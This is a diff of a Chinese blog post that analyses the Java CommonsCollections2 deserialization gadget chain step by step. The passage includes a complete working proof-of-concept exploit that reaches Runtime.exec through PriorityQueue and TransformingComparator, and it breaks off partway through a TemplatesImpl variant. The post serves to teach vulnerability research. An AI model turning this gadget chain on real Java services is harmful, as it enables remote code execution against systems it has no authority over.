@@ -16,9 +16,9 @@
     <meta property="title" content="Java代码审计-CommonsCollections2链分析 - F0rmat&#39;s Blog">
     <meta property="og:title" content="Java代码审计-CommonsCollections2链分析 - F0rmat&#39;s Blog">
     <meta property="twitter:title" content="Java代码审计-CommonsCollections2链分析 - F0rmat&#39;s Blog">
-    <meta name="description" content="0x00 前言 上一次是讲CommonsCollections1链分析,这次CommonsCollections2链的分析，这条链又和第一条有所不同，">
-    <meta property="og:description" content="0x00 前言 上一次是讲CommonsCollections1链分析,这次CommonsCollections2链的分析，这条链又和第一条有所不同，">
-    <meta property="twitter:description" content="0x00 前言 上一次是讲CommonsCollections1链分析,这次CommonsCollections2链的分析，这条链又和第一条有所不同，">
+    <meta name="description" content="0x00 前言 从CC3开始学习完TemplatesImpl的利用，这次是CommonsCollections2链的分析，本来说要学完Template">
+    <meta property="og:description" content="0x00 前言 从CC3开始学习完TemplatesImpl的利用，这次是CommonsCollections2链的分析，本来说要学完Template">
+    <meta property="twitter:description" content="0x00 前言 从CC3开始学习完TemplatesImpl的利用，这次是CommonsCollections2链的分析，本来说要学完Template">
     <meta property="og:type" content="article">
     <title>Java代码审计-CommonsCollections2链分析 - F0rmat&#39;s Blog</title>
 
@@ -30,7 +30,7 @@
     <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
     
       
-      <link rel="stylesheet" href="/css/main.min.20e0b92cb5fa8b84be57768f9bc02dff5255f2173be2d4fe836250769a2ca4fd.css" integrity="sha256-IOC5LLX6i4S+V3aPm8At/1JV8hc74tT+g2JQdpospP0="/>
+      <link rel="stylesheet" href="/css/main.min.b54ec2054930af35e6f9ede7e42673f1fe6d7ebf77b68305e9d6671b4b709b2d.css" integrity="sha256-tU7CBUkwrzXm+e3n5CZz8f5tfr93toMF6dZnG0twmy0="/>
     
     
   <link rel="stylesheet" href="/css/syntax.css"/>
@@ -99,20 +99,20 @@
         <a href="https://xxe.icu/commonscollections2_chain_analysis.html" title="Java代码审计-CommonsCollections2链分析">Java代码审计-CommonsCollections2链分析</a>
     </h1>
     <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
-        <span title=" 2022-11-22 11:04:34 CST">
-            <i class="iconfont icon-calendar" aria-hidden="true"></i> 22 Nov 2022
+        <span title=" 2023-12-05 11:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 05 Dec 2023
         </span>
 
         <span class="hidden xl:inline-block">
             |
             <i class="iconfont icon-book"></i>
-            398 字
+            4027 字
         </span>
 
         <span class="hidden xl:inline-block">
             |
             <i class="iconfont icon-clock-o"></i>
-            1 分钟读完
+            9 分钟读完
         </span>
     </p>
 </div>
@@ -131,7 +131,10 @@
             <li><a href="#环境准备">环境准备</a></li>
           </ul>
         </li>
-        <li><a href="#0x00">0x00</a></li>
+        <li><a href="#0x01-分析过程">0x01 分析过程</a></li>
+        <li><a href="#0x02-使用templatesimpl改进">0x02 使用TemplatesImpl改进</a></li>
+        <li><a href="#0x03-总结">0x03 总结</a></li>
+        <li><a href="#0x04-参考">0x04 参考</a></li>
       </ul>
     </li>
   </ul>
@@ -142,8 +145,8 @@
 
         <div class="post-content dark:text-gray-300">
             <h2 id="0x00-前言">0x00 前言</h2>
-<p>上一次是讲<a href="https://xxe.icu/commonscollections1_chain_analysis.html">CommonsCollections1链分析</a>,这次CommonsCollections2链的分析，这条链又和第一条有所不同，两者不可兼得。CommonsCollections不一样，CC2使用的是<code>commons-collections-4.0</code>版本，因为3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口。</p>
-<p>CC1使用的链</p>
+<p>从CC3开始学习完TemplatesImpl的利用，这次是CommonsCollections2链的分析，本来说要学完TemplatesImpl再来分析CC2，其实CC2不用TemplatesImpl也可以实现，因为CC2主要用到的是<code>PriorityQueue</code>和<code>TransformingComparator</code>两个类。只是官方的ysoserial使用到了TemplatesImpl，因此学完TemplatesImpl再来分析CC2会轻松很多。</p>
+<p>跟CC1不一样的是，CC2是用来解决的<code>commons-collections-4.0</code>版本的问题，因为3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口。当然不是说CC1不能再<code>commons-collections-4.0</code>版本中使用，只是要修改一下LazyMap的decorate方法即可。</p>
 <h3 id="环境准备">环境准备</h3>
 <p>调试工具：IDEA</p>
 <p>Java版本：8u65，下载地址：https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</p>
@@ -154,7 +157,401 @@
 </span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">collections4</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">4</span><span class="o">.</span><span class="na">0</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl"> <span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
-</span></span></code></pre></div><h2 id="0x00">0x00</h2>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="na">javassist</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">javassist</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">3</span><span class="o">.</span><span class="na">25</span><span class="o">.</span><span class="na">0</span><span class="o">-</span><span class="n">GA</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
+</span></span></code></pre></div><h2 id="0x01-分析过程">0x01 分析过程</h2>
+<p>我们先看下这条链的路径：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">		ObjectInputStream.readObject()
+</span></span><span class="line"><span class="cl">			PriorityQueue.readObject()
+</span></span><span class="line"><span class="cl">				...
+</span></span><span class="line"><span class="cl">					TransformingComparator.compare()
+</span></span><span class="line"><span class="cl">						InvokerTransformer.transform()
+</span></span><span class="line"><span class="cl">							Method.invoke()
+</span></span><span class="line"><span class="cl">								Runtime.exec()
+</span></span></code></pre></div><p>我们先从<code>TransformingComparator</code>类进行分析，可以看到在compare方法中利用到了我们熟悉的transform方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231205005314555.png" alt="image-20231205005314555"></p>
+<p>那么我们就要找到一个能传入Comparator的类，那么这条链的PriorityQueue类正好符合，因为PriorityQueue类的构造方法是可以接收Comparator类的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231205010532243.png" alt="image-20231205010532243"></p>
+<p>而且PriorityQueue还会调用到compare方法，我们继续从PriorityQueue类的反序列化方法进行分析,看着也没什么，但是下面会调用到一个heapify方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Read in size, and any hidden stuff
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Read in (and discard) array length
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">size</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Read in all elements.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Elements are guaranteed to be in &#34;proper order&#34;, but the
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// spec has never explained what that might be.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">heapify</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>heapify方法又调用了siftDown方法，注意下这个size变量，如果小于0的话就不能执行下面的siftDown方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">heapify</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="o">(</span><span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">1</span><span class="o">)</span> <span class="o">-</span> <span class="n">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span><span class="o">--)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">siftDown</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>继续看siftDown方法，这里又调用到了两个方法，我们主要看siftDownUsingComparator方法，因为siftDownComparable里面没有调用到我们需要的compare方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">siftDown</span><span class="o">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">,</span> <span class="n">E</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">comparator</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">siftDownUsingComparator</span><span class="o">(</span><span class="n">k</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="n">siftDownComparable</span><span class="o">(</span><span class="n">k</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>可以看到siftDownUsingComparator方法里面就调用到了我们所需要的compare方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">siftDownUsingComparator</span><span class="o">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">,</span> <span class="n">E</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">half</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="o">(</span><span class="n">k</span> <span class="o">&lt;</span> <span class="n">half</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="o">(</span><span class="n">k</span> <span class="o">&lt;&lt;</span> <span class="n">1</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">right</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="n">1</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">right</span> <span class="o">&lt;</span> <span class="n">size</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">comparator</span><span class="o">.</span><span class="na">compare</span><span class="o">((</span><span class="n">E</span><span class="o">)</span> <span class="n">c</span><span class="o">,</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">right</span><span class="o">])</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span> <span class="o">=</span> <span class="n">right</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">comparator</span><span class="o">.</span><span class="na">compare</span><span class="o">(</span><span class="n">x</span><span class="o">,</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">c</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="n">0</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">c</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k</span> <span class="o">=</span> <span class="n">child</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">x</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>这里还有个条件就是comparator变量，这个是要等于TransformingComparator对象才能成功调用，那么这个变量在我们PriorityQueue构造方法的时候就已经赋值了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">public</span> <span class="nf">PriorityQueue</span><span class="o">(</span><span class="kt">int</span> <span class="n">initialCapacity</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">                         <span class="n">Comparator</span><span class="o">&lt;?</span> <span class="kd">super</span> <span class="n">E</span><span class="o">&gt;</span> <span class="n">comparator</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Note: This restriction of at least one is not actually needed,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// but continues for 1.5 compatibility
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">initialCapacity</span> <span class="o">&lt;</span> <span class="n">1</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">initialCapacity</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">comparator</span> <span class="o">=</span> <span class="n">comparator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>所以我们的写法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Transformer</span><span class="o">[]</span>  <span class="n">transformers</span><span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;open /System/Applications/Calculator.app&#34;</span><span class="o">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span><span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="n">transformingComparator</span><span class="o">);</span>
+</span></span></code></pre></div><p>但是执行反序列化的时候却没能成功，是因为我们上面提到的size变量默认是0的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
+</span></span></code></pre></div><p>而且是private属性，我们就需要用到反射进行赋值：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Field</span> <span class="n">size</span> <span class="o">=</span> <span class="n">priorityQueue</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;size&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">size</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">size</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span><span class="n">8</span><span class="o">);</span>
+</span></span></code></pre></div><p>ok，完整的代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.Transformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC2</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Transformer</span><span class="o">[]</span>  <span class="n">transformers</span><span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getMethod&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;invoke&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl">                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&#34;open /System/Applications/Calculator.app&#34;</span><span class="o">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span><span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="n">transformingComparator</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">size</span> <span class="o">=</span> <span class="n">priorityQueue</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;size&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">size</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">size</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span><span class="n">8</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">oss</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><h2 id="0x02-使用templatesimpl改进">0x02 使用TemplatesImpl改进</h2>
+<p>之前学习了CC3，我们可以使用TemplatesImpl进行改写，使用读取字节码的方式进行执行我们的命令。</p>
+<p>如果对TemplatesImpl不懂可以去看下之前的文章：<a href="https://xxe.icu/commonscollections3_chain_analysis.html">Java代码审计-CommonsCollections3链分析</a></p>
+<p>改写完整的代码如下：</p>
+<ul>
+<li>EvilTemplatesImpl</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilTemplatesImpl</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
